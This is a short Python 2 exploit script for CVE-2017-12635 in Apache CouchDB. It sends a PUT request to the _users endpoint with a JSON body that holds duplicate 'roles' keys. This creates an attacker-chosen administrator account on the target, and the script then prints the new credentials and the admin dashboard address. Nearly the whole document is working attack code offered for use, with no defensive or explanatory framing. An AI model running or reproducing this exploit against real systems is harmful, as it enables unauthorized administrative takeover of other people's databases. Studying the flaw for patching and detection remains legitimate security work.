#!/usr/bin/python

import requests
import sys , re
import json 
######################################
##     CVE ID : CVE-2017-12635		  ##
## 	   Product: CouchDB 			      ##
##     Exploit Author : @0xpwny		  ##
######################################

Headers = { "Content-Type":"application/json", 
			"User-Agent": "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"}

def _SETTING_up(username,password):
	data = {
	"type": "user",
  	"name": str(username),
  	"roles": ["_admin"],
  	"roles": [],
  	"password": str(password)}
  	return data

def _SEND_payload(URL):

	try:
		req_url = "{}_users/org.couchdb.user:{}".format(URL,username)

		REQ = requests.put(req_url,data=json.dumps(data),headers=Headers)
	
		if REQ.status_code == 201:
			print "[+] Target is Vulnerable"
			print "[+] username : {}".format(username)
			print "[+] password : {}".format(password)
			print "[+] Dashboard : {}".format(url+"_utils/")
		elif REQ.status_code == 409:
			print "[+] Username Already exist"
		else:
			print "[!] Target Not Vulnerable"
	except:
		print "[x] Are you sure its CouchDB ?"

if __name__ == '__main__':
	username = sys.argv[2]
	password = sys.argv[3]
	url = sys.argv[1]

	data = _SETTING_up(username,password)
	_SEND_payload(url)
